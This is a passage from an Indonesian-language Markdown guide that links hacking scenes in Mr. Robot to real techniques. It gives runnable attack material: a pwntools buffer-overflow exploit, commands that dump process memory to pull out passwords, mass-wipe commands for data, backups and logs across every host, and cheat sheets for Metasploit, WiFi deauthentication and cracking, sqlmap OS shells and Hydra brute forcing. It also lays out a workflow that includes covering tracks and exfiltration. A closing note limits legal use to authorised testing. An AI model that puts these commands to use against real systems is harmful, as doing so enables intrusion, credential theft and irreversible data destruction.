Elliot menemukan skimmer kartu kredit di website.

**Konsep**: Magecart-style attack — inject JavaScript skimmer di checkout page.

```bash
# Analisis skimmer (JS)
# Cari pattern: base64, eval, atob, exfiltration URL

# Decode obfuscated JS
echo "obfuscated_code" | js-beautify
# atau
node -e "console.log(atob('BASE64_CODE'))"

# Scan website untuk skimmer
# Tools: YARA rules, manual code review
```

---

## 📌 S4E4 — "eps4.3_proxy-server.whm"

### Teknik 48: Proxy Chaining & Anonymity

Elliot menggunakan proxy berlapis untuk menyembunyikan jejak.

```bash
# Proxychains dengan multiple proxies
# /etc/proxychains.conf:
# [ProxyList]
# socks5 127.0.0.1 9050
# socks5 proxy1.com 1080
# socks5 proxy2.com 1080

proxychains nmap -sT target.com
proxychains sqlmap -u "http://target.com/page.php?id=1"

# Tor + VPN double layer
# VPN → Tor → Target (atau Tor → VPN → Target)

# I2P (Invisible Internet Project)
sudo apt install i2p
# Akses eepsites (hidden services I2P)
```

---

## 📌 S4E5 — "eps4.4_method-not-allowed.h"

### Teknik 49: Hacking dengan Zero-Day Exploit

Elliot menggunakan zero-day (vulnerability yang belum dipatch).

**Konsep**: Fuzzing → Bug Discovery → Exploit Development

```bash
# Fuzzing untuk cari bug
# Tools: AFL++ (American Fuzzy Lop)
sudo apt install afl++
afl-fuzz -i input_dir -o output_dir -- ./target_binary @@

# Exploit development
# Tools: GDB + PEDA, pwntools
pip3 install pwntools

# Contoh exploit buffer overflow (sederhana)
from pwn import *
r = remote('target.com', 1337)
payload = b'A' * 76 + p32(0x08048456)
r.sendline(payload)
r.interactive()
```

---

## 📌 S4E6 — "eps4.5_site-error.h"

### Teknik 50: Hacking Password Manager

Elliot meng-hack password manager target.

**Konsep**: Memory dump / key extraction.

```bash
# Dump memory process (Linux)
gcore -o dump <PID>
# atau
cat /proc/<PID>/maps
dd if=/proc/<PID>/mem of=dump.mem bs=1 skip=<ADDR> count=<SIZE>

# Analisis dump
strings dump.mem | grep -i password
strings dump.mem | grep -i "key\|secret\|token"

# Tools: Volatility (memory forensics)
volatility -f dump.mem --profile=LinuxUbuntu linux_pslist
volatility -f dump.mem --profile=LinuxUbuntu linux_bash
```

---

## 📌 S4E7 — "eps4.6_not-acceptable.te"

### Teknik 51: Hacking Air-Gapped Systems (Stuxnet-style)

Elliot meng-hack sistem yang terisolasi (air-gapped).

**Konsep**: USB delivery + covert channel (seperti Stuxnet).

```bash
# Covert channel via USB (data exfiltration)
# Tools: USB Rubber Ducky, BadUSB

# Air-gap jump techniques:
# 1. USB malware (Stuxnet method)
# 2. Electromagnetic emanation (TEMPEST/EMSEC)
# 3. Thermal covert channel
# 4. Acoustic covert channel (fans, speakers)

# Simulasi: USB dengan auto-execute
# Di Windows target: autorun.inf + payload
```

---

## 📌 S4E9 — "eps4.8_request-timeout.h"

### Teknik 52: Hacking dengan BGP Hijacking

Elliot membahas BGP hijacking untuk redirect traffic.

**Konsep**: Border Gateway Protocol manipulation.

```bash
# BGP analysis (read-only, untuk defense)
# Tools: BGPStream, RIPE RIS

# Simulasi di lab dengan GNS3 / FRRouting
sudo apt install frr
# Setup BGP router di VM lab
vtysh
# configure terminal
# router bgp 65001
# neighbor 192.168.1.1 remote-as 65002
```

---

## 📌 S4E11 — "eps4.10_excellent.exe"

### Teknik 53: Final Hack — Deus Group

Elliot menghancurkan data Deus Group (shadowy organization).

**Konsep**: Mass data destruction + financial system hack.

```bash
# Encrypt + wipe (seperti Five/Nine tapi lebih targeted)
find /data -type f -exec shred -vfz -n 10 {} \;

# Destroy VM snapshots & backups
rm -rf /backup/*
vboxmanage snapshot "VM_Name" deleteall

# Wipe logs across all systems
ansible all -m shell -a "shred -u /var/log/*.log"
```

---

## 📌 S4E12–13 — "eps4.11_exit.wav" & "eps4.12_goodbye.mov"

### Teknik 54: Whiterose's Machine (Quantum/Physics Hack)

Ini bagian fiksi ilmiah — machine Whiterose berhubungan dengan quantum computing/parallel reality. Tidak ada teknik hacking nyata di sini, tapi konsepnya:

- **Quantum computing threat**: RSA/ECC encryption bisa dipecahkan dengan quantum computer (Shor's algorithm)
- **Post-quantum cryptography**: Lattice-based, hash-based signatures

```bash
# Simulasi quantum threat (educational)
# Tools: Qiskit (IBM quantum SDK)
pip3 install qiskit

# Shor's algorithm simulation (small numbers)
from qiskit import Aer
from qiskit.algorithms import Shor
backend = Aer.get_backend('qasm_simulator')
shor = Shor(quantum_instance=backend)
result = shor.factor(N=15)  # factorisasi 15 = 3 × 5
```

---

# 7. MASTER LIST TOOLS

## 🔧 Reconnaissance & OSINT
| Tool | Fungsi | Install |
|------|--------|---------|
| Nmap | Network scanning | `apt install nmap` |
| theHarvester | Email/username harvesting | `apt install theharvester` |
| Maltego | OSINT visualization | Manual download |
| Shodan | Internet-wide scanning | `pip3 install shodan` |
| recon-ng | Web recon framework | `apt install recon-ng` |
| SpiderFoot | Automated OSINT | `apt install spiderfoot` |

## 🔓 Exploitation
| Tool | Fungsi | Install |
|------|--------|---------|
| Metasploit | Exploitation framework | `apt install metasploit-framework` |
| msfvenom | Payload generator | (bundled Metasploit) |
| SearchSploit | Exploit database | `apt install exploitdb` |
| BeEF | Browser exploitation | `apt install beef-xss` |
| SQLmap | SQL injection | `apt install sqlmap` |

## 📶 Wireless & Network
| Tool | Fungsi | Install |
|------|--------|---------|
| Aircrack-ng | WiFi cracking | `apt install aircrack-ng` |
| Wifite | Automated WiFi attack | `apt install wifite` |
| Bettercap | MITM framework | `apt install bettercap` |
| Ettercap | MITM suite | `apt install ettercap` |
| Wireshark | Packet analyzer | `apt install wireshark` |
| tcpdump | CLI packet capture | `apt install tcpdump` |
| Reaver | WPS brute force | `apt install reaver` |

## 🔑 Password & Cracking
| Tool | Fungsi | Install |
|------|--------|---------|
| John the Ripper | Password cracker | `apt install john` |
| Hashcat | GPU password cracker | `apt install hashcat` |
| Hydra | Network brute force | `apt install hydra` |
| Medusa | Parallel brute force | `apt install medusa` |
| CUPP | Custom wordlist generator | `git clone` |
| Crunch | Wordlist generator | `apt install crunch` |

## 🎭 Social Engineering
| Tool | Fungsi | Install |
|------|--------|---------|
| SET (Social Engineer Toolkit) | Phishing, spoofing | `apt install setoolkit` |
| Gophish | Phishing framework | Manual install |
| King Phisher | Phishing campaign | `apt install king-phisher` |

## 🏢 Post-Exploitation
| Tool | Fungsi | Install |
|------|--------|---------|
| Mimikatz | Windows credential dump | (Windows) |
| BloodHound | AD enumeration | `apt install bloodhound` |
| CrackMapExec | Network lateral movement | `apt install crackmapexec` |
| Impacket | Windows protocol suite | `apt install impacket-scripts` |
| PowerSploit | PowerShell toolkit | `git clone` |
| Empire | C2 framework | `git clone` |

## 🏗️ Hardware (dari Mr. Robot)
| Tool | Fungsi | Harga |
|------|--------|-------|
| Proxmark3 | RFID cloning | ~$100 |
| USB Rubber Ducky | HID injection | ~$50 |
| HackRF One | SDR (radio hacking) | ~$300 |
| BladeRF | SDR advanced | ~$400 |
| Ubertooth | Bluetooth sniffing | ~$100 |
| LAN Turtle | Network implant | ~$50 |
| Bash Bunny | Multi-attack USB | ~$80 |
| Raspberry Pi | Implant/C2 | ~$35 |

## 🚗 Specialized
| Tool | Fungsi |
|------|--------|
| can-utils | CAN bus (car hacking) |
| ICSim | Car simulator |
| OpenBTS | GSM base station |
| GNU Radio | SDR framework |
| binwalk | Firmware analysis |
| Firmware Mod Kit | Firmware modification |

---

# 8. CHEATSHEET REFERENSI CEPAT

## Nmap (Port Scanning)
```bash
nmap -sV target.com              # Version detection
nmap -sS target.com              # SYN scan (stealth)
nmap -sU target.com              # UDP scan
nmap -A target.com               # Aggressive (OS + version + script)
nmap -p- target.com              # All 65535 ports
nmap --script vuln target.com    # Vulnerability scan
nmap -sS -sV -O -p- -T4 target.com  # Full combo
```

## Metasploit (Framework)
```bash
msfconsole                       # Start
search <keyword>                 # Search exploit
use <exploit_path>               # Select exploit
show options                     # Show required options
set RHOSTS <IP>                  # Target
set LHOST <IP>                   # Attacker (listener)
set PAYLOAD <payload>            # Select payload
exploit                          # Run
sessions -l                      # List sessions
sessions -i <ID>                 # Interact session
```

## Aircrack-ng (WiFi)
```bash
# Monitor mode
airmon-ng start wlan0

# Scan networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon
aireplay-ng -0 5 -a <BSSID> wlan0mon  # Deauth attack

# Crack
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

## SQLmap (SQL Injection)
```bash
sqlmap -u "URL?id=1" --dbs
sqlmap -u "URL?id=1" -D db --tables
sqlmap -u "URL?id=1" -D db -T users --dump
sqlmap -u "URL?id=1" --os-shell
```

## Hydra (Brute Force)
```bash
hydra -l admin -P rockyou.txt ssh://192.168.1.100
hydra -L users.txt -P rockyou.txt ftp://192.168.1.100
hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"
```

## John the Ripper
```bash
john --wordlist=rockyou.txt hash.txt
john --show hash.txt
john --format=raw-md5 hash.txt
```

## Wireshark (Filter)
```
ip.addr == 192.168.1.100
tcp.port == 80
http.request.method == "POST"
dns
tcp.flags.syn == 1
```

---

# 🎯 WORKFLOW HACKING ALA ELLIOT (Complete Methodology)

```
1. RECONNAISSANCE (OSINT)
   └── whois, dig, theHarvester, Shodan, social media

2. SCANNING & ENUMERATION
   └── Nmap, Nikto, Dirb/Gobuster, enum4linux

3. VULNERABILITY ANALYSIS
   └── Nessus, OpenVAS, manual analysis, SearchSploit

4. EXPLOITATION
   └── Metasploit, custom exploit, SQLmap, BeEF

5. POST-EXPLOITATION
   └── Privilege escalation, lateral movement, persistence

6. COVERING TRACKS
   └── Log deletion, timestomp, anti-forensics

7. EXFILTRATION / IMPACT
   └── Data encryption, destruction, exfiltration
```

---

# ⚠️ CATATAN PENTING

Semua teknik di atas:
- ✅ **Legal** di lab pribadi, CTF, bug bounty dengan izin, penetration testing dengan kontrak
- ❌ **Ilegal** di sistem tanpa izin (UU ITE di Indonesia, CFAA di US, Computer Misuse Act di UK)

Mr. Robot sendiri menunjukkan konsekuensi dari hacking ilegal — Elliot dipenjara, kehilangan orang-orang terdekat, dan hidup dalam paranoia. Serial ini adalah **warning**, bukan tutorial untuk kejahatan.

---

*Dokumen lengkap: Mr. Robot Hacking Techniques — Season 1–4*
*Format: Markdown (.md) — bisa dibuka di Obsidian, VS Code, GitHub, atau text editor apapun*
